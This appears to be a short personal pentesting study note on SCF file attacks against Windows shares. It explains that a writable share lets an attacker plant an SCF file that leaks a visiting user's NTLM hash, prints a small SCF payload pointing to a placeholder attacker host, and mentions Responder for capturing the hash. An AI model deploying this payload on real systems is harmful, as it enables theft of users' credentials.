---
type: info
scope: []
aliases: [scf]
related: []
created: 16-03-2023 16:51
---
%%
related::
%%

#todo 

## Overview
- If guest given write access, can upload scf which when read by authenticated user, will execute (can be malicious e.g. send ntlm has`)

```scf
[Shell]
Command=2
IconFile\\<hacker_ip>\anything
[Taskbar]
Command=ToggleDesktop
```

- Use [[Responder]] to quickly configure smb server

## References
- 